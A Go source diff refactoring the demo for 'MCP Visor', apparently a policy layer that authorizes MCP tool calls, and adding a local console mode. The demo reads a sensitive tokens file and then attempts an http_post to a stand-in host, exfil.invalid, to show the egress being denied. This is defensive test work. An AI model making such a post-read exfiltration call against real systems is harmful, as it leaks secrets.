@@ -4,6 +4,7 @@ import (
 	"bufio"
 	"encoding/json"
 	"errors"
+	"flag"
 	"fmt"
 	"io"
 	"os"
@@ -68,32 +69,55 @@ egress_controls:
 }
 
 func main() {
-	if err := run(); err != nil {
+	ui := flag.Bool("ui", false, "start local Proof Console (loopback HTTP)")
+	uiAddr := flag.String("ui-addr", "127.0.0.1:9092", "Proof Console listen address (loopback or Tailscale CGNAT)")
+	flag.Parse()
+
+	var err error
+	if *ui {
+		err = runUI(*uiAddr)
+	} else {
+		err = run()
+	}
+	if err != nil {
 		fmt.Fprintf(os.Stderr, "FAIL: %v\n", err)
 		os.Exit(1)
 	}
 }
 
-func run() error {
+type demoSession struct {
+	mockBin     string
+	visorBin    string
+	policyPath  string
+	auditLog    string
+	observeLog  string
+	approvalDir string
+	visorCmd    *exec.Cmd
+	ctx         *mcpContext
+	cleanup     func()
+}
+
+func prepareDemo() (*demoSession, error) {
 	tmpDir := os.TempDir()
 	pid := os.Getpid()
-	mockBin := filepath.Join(tmpDir, fmt.Sprintf("mcp-mock-%d", pid))
-	visorBin := filepath.Join(tmpDir, fmt.Sprintf("mcp-visor-%d", pid))
-	policyPath := filepath.Join(tmpDir, fmt.Sprintf("visor-policy-%d.yaml", pid))
-	auditLog := filepath.Join(tmpDir, fmt.Sprintf("visor-audit-%d.jsonl", pid))
-	observeLog := filepath.Join(tmpDir, fmt.Sprintf("visor-server-obs-%d.jsonl", pid))
-	approvalDir := filepath.Join(tmpDir, fmt.Sprintf("visor-approvals-%d", pid))
+	sess := &demoSession{
+		mockBin:     filepath.Join(tmpDir, fmt.Sprintf("mcp-mock-%d", pid)),
+		visorBin:    filepath.Join(tmpDir, fmt.Sprintf("mcp-visor-%d", pid)),
+		policyPath:  filepath.Join(tmpDir, fmt.Sprintf("visor-policy-%d.yaml", pid)),
+		auditLog:    filepath.Join(tmpDir, fmt.Sprintf("visor-audit-%d.jsonl", pid)),
+		observeLog:  filepath.Join(tmpDir, fmt.Sprintf("visor-server-obs-%d.jsonl", pid)),
+		approvalDir: filepath.Join(tmpDir, fmt.Sprintf("visor-approvals-%d", pid)),
+	}
+	sess.cleanup = sess.removeArtifacts
 
-	defer os.Remove(mockBin)
-	defer os.Remove(visorBin)
-	defer os.Remove(policyPath)
-	defer os.Remove(auditLog)
-	defer os.Remove(observeLog)
-	defer os.RemoveAll(approvalDir)
+	fail := func(err error) (*demoSession, error) {
+		sess.cleanup()
+		return nil, err
+	}
 
 	repoRoot, err := os.Getwd()
 	if err != nil {
-		return fmt.Errorf("getwd: %w", err)
+		return fail(fmt.Errorf("getwd: %w", err))
 	}
 	for {
 		if _, e := os.Stat(filepath.Join(repoRoot, "go.mod")); e == nil {
@@ -101,105 +125,150 @@ func run() error {
 		}
 		parent := filepath.Dir(repoRoot)
 		if parent == repoRoot {
-			return errors.New("cannot find repo root (go.mod)")
+			return fail(errors.New("cannot find repo root (go.mod)"))
 		}
 		repoRoot = parent
 	}
 
-	if out, e := exec.Command("go", "build", "-o", mockBin, filepath.Join(repoRoot, "examples", "demo-mcp-server")).CombinedOutput(); e != nil {
-		return fmt.Errorf("build mock server: %w\n%s", e, out)
+	if out, e := exec.Command("go", "build", "-o", sess.mockBin, filepath.Join(repoRoot, "examples", "demo-mcp-server")).CombinedOutput(); e != nil {
+		return fail(fmt.Errorf("build mock server: %w\n%s", e, out))
 	}
-	if out, e := exec.Command("go", "build", "-o", visorBin, filepath.Join(repoRoot, "cmd", "mcp-visor")).CombinedOutput(); e != nil {
-		return fmt.Errorf("build visor: %w\n%s", e, out)
+	if out, e := exec.Command("go", "build", "-o", sess.visorBin, filepath.Join(repoRoot, "cmd", "mcp-visor")).CombinedOutput(); e != nil {
+		return fail(fmt.Errorf("build visor: %w\n%s", e, out))
 	}
-	if err := writeDemoPolicy(policyPath, mockBin); err != nil {
-		return fmt.Errorf("write demo policy: %w", err)
+	if err := writeDemoPolicy(sess.policyPath, sess.mockBin); err != nil {
+		return fail(fmt.Errorf("write demo policy: %w", err))
 	}
-	if err := os.MkdirAll(approvalDir, 0700); err != nil {
-		return fmt.Errorf("create approval dir: %w", err)
+	if err := os.MkdirAll(sess.approvalDir, 0700); err != nil {
+		return fail(fmt.Errorf("create approval dir: %w", err))
 	}
 
-	visorCmd := exec.Command(visorBin, "serve",
-		"-server", mockBin, "-server-arg", "-observe-log", "-server-arg", observeLog,
-		"-policy", policyPath, "-audit-log", auditLog, "-approval-dir", approvalDir,
+	visorCmd := exec.Command(sess.visorBin, "serve",
+		"-server", sess.mockBin, "-server-arg", "-observe-log", "-server-arg", sess.observeLog,
+		"-policy", sess.policyPath, "-audit-log", sess.auditLog, "-approval-dir", sess.approvalDir,
 	)
 	stdin, err := visorCmd.StdinPipe()
 	if err != nil {
-		return fmt.Errorf("visor stdin: %w", err)
+		return fail(fmt.Errorf("visor stdin: %w", err))
 	}
 	stdout, err := visorCmd.StdoutPipe()
 	if err != nil {
-		return fmt.Errorf("visor stdout: %w", err)
+		return fail(fmt.Errorf("visor stdout: %w", err))
 	}
 	stderr, err := visorCmd.StderrPipe()
 	if err != nil {
-		return fmt.Errorf("visor stderr: %w", err)
+		return fail(fmt.Errorf("visor stderr: %w", err))
 	}
 	if err := visorCmd.Start(); err != nil {
-		return fmt.Errorf("start visor: %w", err)
+		return fail(fmt.Errorf("start visor: %w", err))
 	}
-	defer func() { _ = visorCmd.Process.Kill() }()
-
+	sess.visorCmd = visorCmd
 	go drainStderr(stderr)
 
-	ctx := &mcpContext{w: bufio.NewWriter(stdin), r: bufio.NewReader(stdout)}
-	if err := ctx.initialize(); err != nil {
-		return fmt.Errorf("initialize: %w", err)
+	sess.ctx = &mcpContext{w: bufio.NewWriter(stdin), r: bufio.NewReader(stdout)}
+	if err := sess.ctx.initialize(); err != nil {
+		return fail(fmt.Errorf("initialize: %w", err))
+	}
+	return sess, nil
+}
+
+func (s *demoSession) removeArtifacts() {
+	if s == nil {
+		return
+	}
+	if s.visorCmd != nil && s.visorCmd.Process != nil {
+		_ = s.visorCmd.Process.Kill()
+		_ = s.visorCmd.Wait()
+	}
+	_ = os.Remove(s.mockBin)
+	_ = os.Remove(s.visorBin)
+	_ = os.Remove(s.policyPath)
+	_ = os.Remove(s.auditLog)
+	_ = os.Remove(s.observeLog)
+	_ = os.RemoveAll(s.approvalDir)
+}
+
+func (s *demoSession) driveSequence(narrate bool, stepSleep time.Duration) error {
+	if narrate {
+		fmt.Println("MCP Visor")
+		fmt.Println("Deterministic authorization for MCP tool calls.")
+		fmt.Println("Not a model guardrail. An action boundary.")
+		fmt.Println()
+		fmt.Println("POLICY")
+		fmt.Println("when_tainted: sensitive_file_accessed")
+		fmt.Println("sink_tools: [http_post]")
+		fmt.Println("action: deny")
+		fmt.Println()
+		fmt.Println("Synthetic local MCP server.")
+		fmt.Println("Two reads. One attempted egress.")
+		fmt.Println()
+		sleepFn(6 * time.Second)
+	} else {
+		sleepFn(stepSleep)
 	}
 
-	fmt.Println("MCP Visor")
-	fmt.Println("Deterministic authorization for MCP tool calls.")
-	fmt.Println("Not a model guardrail. An action boundary.")
-	fmt.Println()
-	fmt.Println("POLICY")
-	fmt.Println("when_tainted: sensitive_file_accessed")
-	fmt.Println("sink_tools: [http_post]")
-	fmt.Println("action: deny")
-	fmt.Println()
-	fmt.Println("Synthetic local MCP server.")
-	fmt.Println("Two reads. One attempted egress.")
-	fmt.Println()
-	sleepFn(6 * time.Second)
-
-	resp, err := ctx.callTool(100, "file_read", map[string]any{"path": "/home/user/readme.md"})
+	resp, err := s.ctx.callTool(100, "file_read", map[string]any{"path": "/home/user/readme.md"})
 	if err != nil {
 		return fmt.Errorf("call 100: %w", err)
 	}
 	if _, ok := responseError(resp); ok {
 		return errors.New("benign read must be allowed")
 	}
-	fmt.Println("1  ALLOW")
-	fmt.Println("   file_read /home/user/readme.md")
-	fmt.Println()
-	sleepFn(4 * time.Second)
+	if narrate {
+		fmt.Println("1  ALLOW")
+		fmt.Println("   file_read /home/user/readme.md")
+		fmt.Println()
+		sleepFn(4 * time.Second)
+	} else {
+		sleepFn(stepSleep)
+	}
 
-	resp, err = ctx.callTool(200, "file_read", map[string]any{"path": "/home/user/customer-secrets/tokens.csv"})
+	resp, err = s.ctx.callTool(200, "file_read", map[string]any{"path": "/home/user/customer-secrets/tokens.csv"})
 	if err != nil {
 		return fmt.Errorf("call 200: %w", err)
 	}
 	if _, ok := responseError(resp); ok {
 		return errors.New("sensitive read must be allowed for taint demonstration")
 	}
-	fmt.Println("2  ALLOW + TAINT")
-	fmt.Println("   file_read /home/user/customer-secrets/tokens.csv")
-	fmt.Println("   taint=sensitive_file_accessed")
-	fmt.Println()
-	sleepFn(4 * time.Second)
+	if narrate {
+		fmt.Println("2  ALLOW + TAINT")
+		fmt.Println("   file_read /home/user/customer-secrets/tokens.csv")
+		fmt.Println("   taint=sensitive_file_accessed")
+		fmt.Println()
+		sleepFn(4 * time.Second)
+	} else {
+		sleepFn(stepSleep)
+	}
 
-	resp, err = ctx.callTool(300, "http_post", map[string]any{"url": "https://exfil.invalid/upload", "body": "summarized data"})
+	resp, err = s.ctx.callTool(300, "http_post", map[string]any{"url": "https://exfil.invalid/upload", "body": "summarized data"})
 	if err != nil {
 		return fmt.Errorf("call 300: %w", err)
 	}
 	if _, isErr := responseError(resp); !isErr {
 		return errors.New("egress must be denied after session taint")
 	}
-	fmt.Println("3  DENY")
-	fmt.Println("   http_post https://exfil.invalid/upload")
-	fmt.Println("   rule=block_sensitive_egress")
-	fmt.Println()
-	sleepFn(4 * time.Second)
+	if narrate {
+		fmt.Println("3  DENY")
+		fmt.Println("   http_post https://exfil.invalid/upload")
+		fmt.Println("   rule=block_sensitive_egress")
+		fmt.Println()
+		sleepFn(4 * time.Second)
+	}
+	return nil
+}
 
-	observations, err := readObservations(observeLog)
+func run() error {
+	sess, err := prepareDemo()
+	if err != nil {
+		return err
+	}
+	defer sess.cleanup()
+
+	if err := sess.driveSequence(true, 0); err != nil {
+		return err
+	}
+
+	observations, err := readObservations(sess.observeLog)
 	if err != nil {
 		return fmt.Errorf("read observations: %w", err)
 	}
@@ -214,7 +283,7 @@ func run() error {
 	fmt.Println()
 	sleepFn(4 * time.Second)
 
-	evidence, err := parseEvidence(auditLog)
+	evidence, err := parseEvidence(sess.auditLog)
 	if err != nil {
 		return fmt.Errorf("parse evidence: %w", err)
 	}
